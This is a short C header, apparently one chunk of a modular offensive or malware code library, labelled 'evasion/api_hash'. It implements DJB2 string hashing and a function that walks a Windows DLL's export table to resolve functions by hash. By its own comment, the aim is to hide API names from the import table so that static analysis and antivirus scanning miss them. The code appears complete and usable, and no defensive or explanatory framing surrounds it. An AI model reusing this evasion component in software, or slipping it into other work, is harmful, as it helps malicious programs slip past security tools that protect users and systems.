// chunk: evasion/api_hash
// depends: (none)
// provides: djb2_hash, resolve_api
// note: DJB2 hash-based API resolution — hides API names from import table

#ifndef CHUNK_API_HASH
#define CHUNK_API_HASH

#include <windows.h>

static DWORD djb2_hash(const char *str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

static FARPROC resolve_api(const char *module, DWORD hash) {
    HMODULE hMod = LoadLibraryA(module);
    if (!hMod) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)hMod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE *)hMod + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names = (DWORD *)((BYTE *)hMod + exports->AddressOfNames);
    WORD *ordinals = (WORD *)((BYTE *)hMod + exports->AddressOfNameOrdinals);
    DWORD *functions = (DWORD *)((BYTE *)hMod + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char *name = (const char *)((BYTE *)hMod + names[i]);
        if (djb2_hash(name) == hash) {
            return (FARPROC)((BYTE *)hMod + functions[ordinals[i]]);
        }
    }
    return NULL;
}

#endif
